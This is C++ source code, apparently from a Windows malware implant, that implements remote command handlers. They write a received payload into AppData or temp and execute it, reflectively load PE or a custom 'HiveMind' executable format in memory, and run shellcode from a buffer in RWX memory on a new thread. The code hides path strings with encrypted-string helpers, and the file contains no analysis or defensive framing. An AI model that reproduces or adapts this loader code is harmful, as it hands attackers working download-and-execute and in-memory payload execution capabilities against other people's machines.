#include "commands.hpp"
#include "strings.hpp"
#include "utils.hpp"
#include "DllLoader.h"

DownloadExecute::DownloadExecute()
{
#ifdef _DEBUG
	WriteLog(L"[DownloadExecute] constructor");
#endif
	RtlSecureZeroMemory(&this->status, sizeof(this->status));
	this->status.status.de_status = downloadexec_status_t::STATUS_ERROR_DE_UNKNOWN;
}

DownloadExecute::~DownloadExecute()
{
#ifdef _DEBUG
	WriteLog(L"[DownloadExecute] destructor");
#endif
	if (this->status.data_result.lpBuffer != nullptr)
		delete[]this->status.data_result.lpBuffer;
	RtlSecureZeroMemory(&this->status, sizeof(this->status));
}

BOOL DownloadExecute::execute(blob * pbDataBuffer)
{
	Sleep(10);

	downloadexec_status_t dwRet = downloadexec_status_t::STATUS_ERROR_DE_UNKNOWN;

#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[DownloadExecute::execute] executing PE size %d", pbDataBuffer->dwBufSize);
	WriteLog(debugOut);
#endif

	// всю страницу займем, мало ли у нас long path
	UINT uMaxCharsPath = 2048 - 1;
	PWCHAR pwFileDropPath = new WCHAR[uMaxCharsPath + 1];
	do
	{
		if (pwFileDropPath == nullptr)
			break;

		RtlSecureZeroMemory(pwFileDropPath, uMaxCharsPath * sizeof(WCHAR));

		downloadexec_status_t dwMakeRet = DEMakePath(pwFileDropPath, uMaxCharsPath);
		if (dwMakeRet != downloadexec_status_t::STATUS_DE_SUCCESS)
		{
			dwRet = dwMakeRet;
			break;
		}

#ifdef _DEBUG
		WriteLog(L"[DownloadExecute::execute] dumping and executing file at ", pwFileDropPath);
#endif

		downloadexec_status_t dwCreateRet = Dump2File(pwFileDropPath, pbDataBuffer->lpBuffer, pbDataBuffer->dwBufSize);
		if (dwCreateRet != downloadexec_status_t::STATUS_DE_SUCCESS)
		{
			dwRet = dwCreateRet;
			break;
		}

		dwRet = ExecFile(pwFileDropPath);

	} while (FALSE);


	if (pwFileDropPath != nullptr)
		delete[]pwFileDropPath;


	this->status.status.de_status = dwRet;
	return (this->status.status.de_status == downloadexec_status_t::STATUS_DE_SUCCESS);
}

_exec_status * DownloadExecute::get_status()
{
	return &this->status;
}

downloadexec_status_t DownloadExecute::ExecFile(PWCHAR pwFilePath)
{
	downloadexec_status_t dwRet = downloadexec_status_t::STATUS_ERROR_DE_EXEC_UNKNOWN;

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	do
	{
		BOOL bRet = CreateProcessW(pwFilePath, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);

		if (bRet)
			dwRet = downloadexec_status_t::STATUS_DE_SUCCESS;
		else if (GetLastError() == ERROR_ACCESS_DENIED)
			dwRet = downloadexec_status_t::STATUS_ERROR_DE_EXEC_ACCESSDENIED;
		else if (GetLastError() == ERROR_FILE_NOT_FOUND)
			dwRet = downloadexec_status_t::STATUS_ERROR_DE_EXEC_FILENOTFOUND;

		if (pi.hProcess)
			CloseHandle(pi.hProcess);
		if (pi.hThread)
			CloseHandle(pi.hThread);

	} while (FALSE);

	return dwRet;
}

downloadexec_status_t DownloadExecute::Dump2File(PWCHAR wchName, LPBYTE lpData, SIZE_T dwSize)
{
	downloadexec_status_t dwRet = downloadexec_status_t::STATUS_ERROR_DE_CREATE_FILE_UNKNOWN;
	HANDLE hFile = CreateFileW(wchName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	do
	{
		if (hFile == INVALID_HANDLE_VALUE)
		{
#ifdef _DEBUG
			WriteLog(L"[DownloadExecute::Dump2File] error creating file at ", wchName);
#endif
			if (GetLastError() == ERROR_ACCESS_DENIED)
				dwRet = downloadexec_status_t::STATUS_ERROR_DE_CREATE_FILE_ACCESSDENIED;
			break;
		}

		DWORD dwWritten;
		if (WriteFile(hFile, lpData, dwSize, &dwWritten, 0))
			dwRet = downloadexec_status_t::STATUS_DE_SUCCESS;

	} while (FALSE);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	return dwRet;
}

downloadexec_status_t DownloadExecute::DEMakePath(PWCHAR pwFilePath, UINT uMaxCharsPath)
{
	CCryptString cStr_appdata(cryptedstr_appdata);
	CCryptString cStr_dottmp(cryptedstr_dottmp);

	WCHAR wchFileName[256];
	RtlSecureZeroMemory(wchFileName, sizeof(wchFileName));

	if ((!GetEnvironmentVariableW(cStr_appdata.w_str(), pwFilePath, uMaxCharsPath)) || (GetLastError() == ERROR_ENVVAR_NOT_FOUND))
	{
#ifdef _DEBUG
		WriteLog(L"[DownloadExecute::DEMakePath] error getting path to ", cStr_appdata.w_str());
#endif
		if (!GetTempPathW(uMaxCharsPath, pwFilePath))
		{
#ifdef _DEBUG
			WriteLog(L"[DownloadExecute::DEMakePath] error getting path to temp folder");
#endif
			return downloadexec_status_t::STATUS_ERROR_DE_PATH_ERROR;
		}
	}

	AddSlash(pwFilePath);
	_itow(GetTickCount(), wchFileName, 10);
	wcscat(pwFilePath, wchFileName);
	wcscat(pwFilePath, cStr_dottmp.w_str());

	return downloadexec_status_t::STATUS_DE_SUCCESS;;
}

PeLoader::PeLoader()
{
#ifdef _DEBUG
	WriteLog(L"[PeLoader] constructor");
#endif
	RtlSecureZeroMemory(&this->status, sizeof(this->status));
	this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_UNKNOWN;
}

PeLoader::~PeLoader()
{
#ifdef _DEBUG
	WriteLog(L"[PeLoader] destructor");
#endif
	if (this->status.data_result.lpBuffer != nullptr)
		delete[]this->status.data_result.lpBuffer;
	RtlSecureZeroMemory(&this->status, sizeof(this->status));
}

BOOL PeLoader::execute(blob * pbDataBuffer)
{
	this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_UNKNOWN;

	BOOL bHiveExecutable = FALSE;
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pbDataBuffer->lpBuffer;
	IMAGE_HIVEMIND_HEADER *pHiveHeader = (IMAGE_HIVEMIND_HEADER*)pbDataBuffer->lpBuffer;
#ifndef _WIN64
	PIMAGE_HIVEMIND_NT_HEADER32 old_hiveheader;
	PIMAGE_NT_HEADERS32 old_header;
#else
	PIMAGE_HIVEMIND_NT_HEADER64 old_hiveheader;
	PIMAGE_NT_HEADERS64 old_header;
#endif

	loader_functions ctx;
	RtlSecureZeroMemory(&ctx, sizeof(ctx));
	do
	{
		// проверка исключительно на текущую разрядность хостового апп
		if (pbDataBuffer->dwBufSize <= (sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)))
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] error file is too small to be PE DLL");
#endif
			this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_INVALIDPE;
			break;
		}

		if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
		{
			if ((pHiveHeader->dwHiveSign1 != IMAGE_HIVEMIND_SIGNATURE_PART1) || (pHiveHeader->dwHiveSign2 != IMAGE_HIVEMIND_SIGNATURE_PART2))
			{
#ifdef _DEBUG
				WriteLog(L"[PeLoader::execute] file neither PE nor HM Executable");
#endif
				this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_INVALIDPE;
				break;
			}

			// файл в формате HM Executable
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] file is in HM Executable format");
#endif
			bHiveExecutable = TRUE;
		}

#ifndef _WIN64
		if (!bHiveExecutable)
			old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(pbDataBuffer->lpBuffer))[pDos->e_lfanew];
		else
			old_hiveheader = (PIMAGE_HIVEMIND_NT_HEADER32)&((const unsigned char *)(pbDataBuffer->lpBuffer))[pHiveHeader->e_lfanew];
#else
		if (!bHiveExecutable)
			old_header = (PIMAGE_NT_HEADERS64)&((const unsigned char *)(pbDataBuffer->lpBuffer))[pDos->e_lfanew];
		else
			old_hiveheader = (PIMAGE_HIVEMIND_NT_HEADER64)&((const unsigned char*)(pbDataBuffer->lpBuffer))[pHiveHeader->e_lfanew];
#endif

		if (bHiveExecutable) // они соответствуют кроме сигнатуры
			old_header = (PIMAGE_NT_HEADERS)old_hiveheader;


#ifdef _WIN64
		if (old_header->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] host is x64 process, DLL is not AMD64");
#endif
			this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_INVALID_ARCH;
			break;
		}
#else
		if (old_header->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] host is x86 process, DLL is not I386");
#endif
			this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_INVALID_ARCH;
			break;
		}
#endif

#ifndef _WIN64
		if ((IMAGE_DIRECTORY_ENTRY_EXCEPTION < old_header->OptionalHeader.NumberOfRvaAndSizes) && (old_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress != 0))
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] file contains exception directory, exiting");
#endif
			this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_EXCEPTION_DIRECTORY;
			break;
		}
#endif

		if ((IMAGE_DIRECTORY_ENTRY_TLS < old_header->OptionalHeader.NumberOfRvaAndSizes) && (old_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0))
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] file contains TLS, exiting");
#endif
			this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_TLS_DIRECTORY;
			break;
		}

		if ((IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR < old_header->OptionalHeader.NumberOfRvaAndSizes) && (old_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0))
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] file contains COM directory, exiting");
#endif
			this->status.status.dll_status = dllloader_status_t::STATUS_ERROR_DL_COM_DIRECTORY;
			break;
		}

		if (!resolve_functions(&ctx))
		{
#ifdef _DEBUG
			WriteLog(L"[PeLoader::execute] cant resolve functions for PE loader");
#endif
			break;
		}

		if (MemoryLoadLibrary(&ctx, pbDataBuffer->lpBuffer))
			this->status.status.dll_status = dllloader_status_t::STATUS_DL_SUCCESS;

	} while (FALSE);

	return (this->status.status.dll_status == dllloader_status_t::STATUS_DL_SUCCESS);
}

_exec_status * PeLoader::get_status()
{
	return &this->status;
}

ShellcodeLoader::ShellcodeLoader()
{
#ifdef _DEBUG
	WriteLog(L"[ShellcodeLoader] constructor");
#endif
	RtlSecureZeroMemory(&this->status, sizeof(this->status));
	this->status.status.sc_status = shellcodeloader_status_t::STATUS_ERROR_SC_UNKNOWN;

}

ShellcodeLoader::~ShellcodeLoader()
{
#ifdef _DEBUG
	WriteLog(L"[ShellcodeLoader] destructor");
#endif
	if (this->status.data_result.lpBuffer != nullptr)
		delete[]this->status.data_result.lpBuffer;
	RtlSecureZeroMemory(&this->status, sizeof(this->status));
}

BOOL ShellcodeLoader::execute(blob * pbDataBuffer)
{
	this->status.status.sc_status = shellcodeloader_status_t::STATUS_ERROR_SC_UNKNOWN;

	if ((pbDataBuffer == nullptr) || (pbDataBuffer->lpBuffer == nullptr) || (pbDataBuffer->dwBufSize == 0))
		return FALSE;

	LPBYTE lpBuffer = (LPBYTE)VirtualAlloc(0, pbDataBuffer->dwBufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBuffer != nullptr)
	{
		_RtlCopyMemory(lpBuffer, pbDataBuffer->lpBuffer, pbDataBuffer->dwBufSize);
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
		if (hThread)
		{
			this->status.status.sc_status = shellcodeloader_status_t::STATUS_ERROR_SC_SUCCESS;
			CloseHandle(hThread);
		}
		else
		{
			VirtualFree(lpBuffer, 0, MEM_RELEASE);
		}
	}

	return (this->status.status.sc_status == shellcodeloader_status_t::STATUS_ERROR_SC_SUCCESS);
}

_exec_status * ShellcodeLoader::get_status()
{
	return &this->status;
}
